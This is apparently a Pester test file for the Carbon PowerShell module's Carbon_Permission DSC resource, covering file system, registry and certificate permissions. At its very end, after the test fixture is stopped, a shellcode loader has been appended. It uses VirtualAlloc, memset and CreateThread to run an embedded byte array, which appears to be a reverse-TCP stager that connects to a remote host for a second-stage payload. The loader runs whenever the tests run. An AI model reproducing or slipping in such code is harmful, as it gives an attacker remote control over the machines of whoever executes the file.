











Import-Module -Name (Join-Path -Path $PSScriptRoot -ChildPath 'CarbonDscTest' -Resolve) -Force

$UserName = 'CarbonDscTestUser'
$Password = [Guid]::NewGuid().ToString()
$tempDir = $null
Install-User -Credential (New-Credential -UserName $UserName -Password $Password)

function New-MockDir
{
    $path = (Join-Path -Path (Get-Item -Path 'TestDrive:').FullName -ChildPath ([Guid]::NewGuid().ToString()))
    Install-Directory -Path $path
    return $path
}


Describe 'Carbon_Permission when non-existent permissions should be absent' {

    Start-CarbonDscTestFixture 'Permission'

    $tempDir = New-MockDir

    Context 'the user' {
        It 'should not have access to the directory' {
            Get-Permission -Path $tempDir -Identity $UserName -Inherited | Should BeNullOrEmpty
        }
    }
    Test-TargetResource -Identity $UserName -Path $tempDir -Ensure Absent -ErrorVariable 'errors'

    It 'should not throw any errors' {
        $errors | Should BeNullOrEmpty
    }
}

Describe 'Carbon_Permission when no permissions should be present' {

    Start-CarbonDscTestFixture 'Permission'

    $tempDir = New-MockDir
    Grant-Permission -Path $tempDir -Identity $UserName -Permission FullControl 

    Context 'the user' {
        It 'should have access to the directory' {
            Get-Permission -Path $tempDir -Identity $UserName -Inherited | Should Not BeNullOrEmpty
        }
    }
    Test-TargetResource -Identity $UserName -Path $tempDir -Ensure Present -ErrorVariable 'errors' -ErrorAction SilentlyContinue

    It 'should throw an error' {
        $errors | Should Not BeNullOrEmpty
        $errors | Should Match 'is mandatory'
    }
}

Describe 'Carbon_Permission.when appending permissions' {

    Start-CarbonDscTestFixture 'Permission'

    $tempDir = New-MockDir

    $rule1 = @{
                    Identity = $UserName;
                    Path = $tempDir;
                    Permission = 'ReadAndExecute';
                    ApplyTo = 'ContainerAndSubContainersAndLeaves';
                    Append = $true;
                    Ensure = 'Present';
               }

    $rule2 = @{
                    Identity = $UserName;
                    Path = $tempDir;
                    Permission = 'Write';
                    ApplyTo = 'ContainerAndLeaves';
                    Append = $true;
                    Ensure = 'Present';
               }

    It ('should report correct resource state') {
        $result = Test-TargetResource @rule1
        $result | Should -BeFalse
        $result = Test-TargetResource @rule2
        $result | Should -BeFalse
    }

    Set-TargetResource @rule1

    It ('should report correct resource state') {
        $result = Test-TargetResource @rule1
        $result | Should -BeTrue
        $result = Test-TargetResource @rule2
        $result | Should -BeFalse
    }

    Set-TargetResource @rule2

    It ('should report correct resource state') {
        $result = Test-TargetResource @rule1
        $result | Should -BeTrue
        $result = Test-TargetResource @rule2
        $result | Should -BeTrue
    }


    It 'should add two rules to directory' {
        $perm = Get-Permission -Path $tempDir -Identity $UserName 
        $perm | Should -HaveCount 2
    }
}

Describe 'Carbon_Permission.when granting permissions on registry' {
    Start-CarbonDscTestFixture 'Permission'
    $tempDir = New-MockDir
    $Global:Error.Clear()
    It 'should grant permission on registry' {
        $keyPath = 'hkcu:\{0}' -f (Split-Path -Leaf -Path $tempDir)
        New-Item -Path $keyPath
        try
        {
            (Test-Permission -Identity $UserName -Path $keyPath -Permission ReadKey -ApplyTo Container -Exact) | Should Be $false
            (Test-TargetResource -Identity $UserName -Path $keyPath -Permission ReadKey -Ensure Present) | Should Be $false
    
            Set-TargetResource -Identity $UserName -Path $keyPath -Permission ReadKey -ApplyTo Container -Ensure Present
            $Global:Error.Count | Should Be 0
            (Test-Permission -Identity $UserName -Path $keyPath -Permission ReadKey -ApplyTo Container -Exact) | Should Be $true
            (Test-TargetResource -Identity $UserName -Path $keyPath -Permission ReadKey -Ensure Present) | Should Be $true
    
            Set-TargetResource -Identity $UserName -Path $keyPath -Permission ReadKey -ApplyTo Container -Ensure Absent
            $Global:Error.Count | Should Be 0
            (Test-Permission -Identity $UserName -Path $keyPath -Permission ReadKey -ApplyTo Container -Exact) | Should Be $false
            (Test-TargetResource -Identity $UserName -Path $keyPath -Permission ReadKey -Ensure Absent) | Should Be $true
        }
        finally
        {
            Remove-Item -Path $keyPath
        }
    }
}

Describe 'Carbon_Permission' {
    BeforeAll {
        Start-CarbonDscTestFixture 'Permission'
    }
    
    BeforeEach {
        $Global:Error.Clear()
        $tempDir = New-MockDir
    }
    
    AfterEach {
        if( (Test-Path -Path $tempDir -PathType Container) )
        {
            Remove-Item -Path $tempDir -Recurse
        }
    }

    It 'should grant permission on file system' {
        Set-TargetResource -Identity $UserName -Path $tempDir -Permission FullControl -Ensure Present
        $Global:Error.Count | Should Be 0
        (Test-Permission -Identity $UserName -Path $tempDir -Permission FullControl -ApplyTo ContainerAndSubContainersAndLeaves -Exact) | Should Be $true
    }
    
    It 'should grant permission with inheritence on file system' {
        Set-TargetResource -Identity $UserName -Path $tempDir -Permission FullControl -ApplyTo Container -Ensure Present
        $Global:Error.Count | Should Be 0
        (Test-Permission -Identity $UserName -Path $tempDir -Permission FullControl -ApplyTo Container -Exact) | Should Be $true
    }
    
    It 'should grant permission on private key' {
        $cert = Install-Certificate -Path (Join-Path -Path $PSScriptRoot -ChildPath 'Cryptography\CarbonTestPrivateKey.pfx' -Resolve) -StoreLocation LocalMachine -StoreName My
        try
        {
            $certPath = Join-Path -Path 'cert:\LocalMachine\My' -ChildPath $cert.Thumbprint -Resolve
            (Get-Permission -Path $certPath -Identity $UserName) | Should BeNullOrEmpty
            (Test-TargetResource -Path $certPath -Identity $UserName -Permission 'GenericRead') | Should Be $false
    
            Set-TargetResource -Identity $UserName -Path $certPath -Permission GenericRead -Ensure Present
            (Get-Permission -Path $certPath -Identity $UserName) | Should Not BeNullOrEmpty
            (Test-TargetResource -Path $certPath -Identity $UserName -Permission 'GenericRead') | Should Be $true
    
            Set-TargetResource -Identity $UserName -Path $certPath -Permission GenericRead -Ensure Absent
            (Get-Permission -Path $certPath -Identity $UserName) | Should BeNullOrEmpty
            (Test-TargetResource -Path $certPath -Identity $UserName -Permission 'GenericRead' -Ensure Absent) | Should Be $true
        }
        finally
        {
            Uninstall-Certificate -Certificate $cert -StoreLocation LocalMachine -StoreName My
        }
    }
    
    It 'should change permission' {
        Set-TargetResource -Identity $UserName -Path $tempDir -Permission FullControl -Ensure Present
        Set-TargetResource -Identity $UserName -Path $tempDir -Permission Read -ApplyTo Container -Ensure Present
        (Test-Permission -Identity $UserName -Path $tempDir -Permission Read -ApplyTo Container -Exact) | Should Be $true
    }
    
    It 'should revoke permission' {
        Set-TargetResource -Identity $UserName -Path $tempDir -Permission FullControl -Ensure Present
        Set-TargetResource -Identity $UserName -Path $tempDir -Ensure Absent
        (Test-Permission -Identity $UserName -Path $tempDir -Permission FullControl -Exact) | Should Be $false
    }
    
    It 'should require permission when granting' {
        Set-TargetResource -Identity $UserName -Path $tempDir -Ensure Present -ErrorAction SilentlyContinue
        $Global:Error.Count | Should BeGreaterThan 0
        $Global:Error[0] | Should Match 'mandatory'
        (Get-Permission -Path $tempDir -Identity $UserName) | Should BeNullOrEmpty
    }
    
    It 'should get no permission' {
        $resource = Get-TargetResource -Identity $UserName -Path $tempDir
        $resource | Should Not BeNullOrEmpty
        $resource.Identity | Should Be $UserName
        $resource.Path | Should Be $tempDir
        $resource.Permission | Should BeNullOrEmpty
        $resource.ApplyTo | Should BeNullOrEmpty
        Assert-DscResourceAbsent $resource
    }
    
    It 'should get current permission' {
        Set-TargetResource -Identity $UserName -Path $tempDir -Permission FullControl -Ensure Present
        $resource = Get-TargetResource -Identity $UserName -Path $tempDir
        $resource | Should Not BeNullOrEmpty
        $resource.Identity | Should Be $UserName
        $resource.Path | Should Be $tempDir
        $resource.Permission | Should Be 'FullControl'
        $resource.ApplyTo | Should Be 'ContainerAndSubContainersAndLeaves'
        Assert-DscResourcePresent $resource
    }
    
    It 'should get multiple permissions' {
        Set-TargetResource -Identity $UserName -Path $tempDir -Permission Read,Write -Ensure Present
        $resource = Get-TargetResource -Identity $UserName -Path $tempDir
        ,$resource.Permission | Should BeOfType 'string[]'
        ($resource.Permission -join ',') | Should Be 'Write,Read'
    }
    
    
    It 'should get current container inheritance flags' {
        Set-TargetResource -Identity $UserName -Path $tempDir -Permission FullControl -ApplyTo SubContainers -Ensure Present
        $resource = Get-TargetResource -Identity $UserName -Path $tempDir
        $resource | Should Not BeNullOrEmpty
        $resource.ApplyTo | Should Be 'SubContainers'
    }
    
    It 'should test no permission' {
        (Test-TargetResource -Identity $UserName -Path $tempDir -Permission FullControl -Ensure Present) | Should Be $false
        (Test-TargetResource -Identity $UserName -Path $tempDir -Permission FullControl -ApplyTo ContainerAndSubContainersAndLeaves -Ensure Present) | Should Be $false
        (Test-TargetResource -Identity $UserName -Path $tempDir -Permission FullControl -Ensure Absent) | Should Be $true
        (Test-TargetResource -Identity $UserName -Path $tempDir -Permission FullControl -ApplyTo ContainerAndSubContainersAndLeaves -Ensure Absent) | Should Be $true
    }
    
    It 'should test existing permission' {
        Set-TargetResource -Identity $UserName -Path $tempDir -Permission Read -ApplyTo Container -Ensure Present
        (Test-TargetResource -Identity $UserName -Path $tempDir -Permission Read -Ensure Present) | Should Be $true
        (Test-TargetResource -Identity $UserName -Path $tempDir -Permission Read -ApplyTo Container -Ensure Present) | Should Be $true
        (Test-TargetResource -Identity $UserName -Path $tempDir -Permission Read -Ensure Absent) | Should Be $false
        (Test-TargetResource -Identity $UserName -Path $tempDir -Permission Read -ApplyTo Container -Ensure Absent) | Should Be $false
    
        
        (Test-TargetResource -Identity $UserName -Path $tempDir -Permission Write -Ensure Present) | Should Be $false
        (Test-TargetResource -Identity $UserName -Path $tempDir -Permission Read -ApplyTo Leaves -Ensure Present) | Should Be $false
        (Test-TargetResource -Identity $UserName -Path $tempDir -Permission Write -Ensure Absent) | Should Be $false
        (Test-TargetResource -Identity $UserName -Path $tempDir -Permission Read -ApplyTo Leaves -Ensure Absent) | Should Be $false
    }
    
    
    configuration DscConfiguration
    {
        param(
            $Ensure
        )
    
        Set-StrictMode -Off
    
        Import-DscResource -Name '*' -Module 'Carbon'
    
        node 'localhost'
        {
            Carbon_Permission set
            {
                Identity = $UserName;
                Path = $tempDir;
                Permission = 'Read','Write';
                ApplyTo = 'Container';
                Ensure = $Ensure;
            }
        }
    }
    
    It 'should run through dsc' {
        & DscConfiguration -Ensure 'Present' -OutputPath $CarbonDscOutputRoot
        Start-DscConfiguration -Wait -ComputerName 'localhost' -Path $CarbonDscOutputRoot -Force
        $Global:Error.Count | Should Be 0
        (Test-TargetResource -Identity $UserName -Path $tempDir -Permission 'Read','Write' -ApplyTo 'Container' -Ensure 'Present') | Should Be $true
        (Test-TargetResource -Identity $UserName -Path $tempDir -Permission 'Read','Write' -ApplyTo 'Container' -Ensure 'Absent') | Should Be $false
    
        & DscConfiguration -Ensure 'Absent' -OutputPath $CarbonDscOutputRoot 
        Start-DscConfiguration -Wait -ComputerName 'localhost' -Path $CarbonDscOutputRoot -Force
        $Global:Error.Count | Should Be 0
        (Test-TargetResource -Identity $UserName -Path $tempDir -Permission 'Read','Write' -ApplyTo 'Container' -Ensure 'Present') | Should Be $false
        (Test-TargetResource -Identity $UserName -Path $tempDir -Permission 'Read','Write' -ApplyTo 'Container' -Ensure 'Absent') | Should Be $true

        $result = Get-DscConfiguration
        $Global:Error.Count | Should Be 0
        $result | Should BeOfType ([Microsoft.Management.Infrastructure.CimInstance])
        $result.PsTypeNames | Where-Object { $_ -like '*Carbon_Permission' } | Should Not BeNullOrEmpty
    }

    configuration DscConfiguration2
    {
        param(
            $Ensure
        )
    
        Set-StrictMode -Off
    
        Import-DscResource -Name '*' -Module 'Carbon'
    
        node 'localhost'
        {
            Carbon_Permission set
            {
                Identity = $UserName;
                Path = $tempDir;
                Ensure = 'Absent';
            }
        }
    }
    
    It 'should not fail when user doesn''t have permission' {
        Revoke-Permission -Path $tempDir -Identity $UserName
        & DscConfiguration2 -Ensure 'Present' -OutputPath $CarbonDscOutputRoot
        Start-DscConfiguration -Wait -ComputerName 'localhost' -Path $CarbonDscOutputRoot -Force
        $Global:Error.Count | Should Be 0
    }
    
    configuration DscConfiguration3
    {
        param(
            $Ensure
        )
    
        Set-StrictMode -Off
    
        Import-DscResource -Name '*' -Module 'Carbon'
    
        node 'localhost'
        {
            Carbon_Permission SetRead
            {
                Identity = $UserName;
                Path = $tempDir;
                Permission = 'ReadAndExecute'
                ApplyTo = 'ContainerAndSubContainersAndLeaves';
                Append = $true;
                Ensure = 'Present';
            }
            Carbon_Permission SetWrite
            {
                Identity = ('.\{0}' -f $UserName);
                Path = $tempDir;
                Permission = 'Write'
                ApplyTo = 'ContainerAndLeaves';
                Append = $true;
                Ensure = 'Present';
            }
        }
    }
    
    It 'should apply multiple permissions' {
        Revoke-Permission -Path $tempDir -Identity $UserName
        & DscConfiguration3 -Ensure 'Present' -OutputPath $CarbonDscOutputRoot
        Start-DscConfiguration -Wait -ComputerName 'localhost' -Path $CarbonDscOutputRoot -Force
        $Global:Error.Count | Should Be 0
        Get-CPermission -Path $tempDir -Identity $UserName | Should -HaveCount 2
    }
    
}

Stop-CarbonDscTestFixture

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x29,0xeb,0x80,0x55,0x68,0x02,0x00,0x07,0xd0,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x75,0xee,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

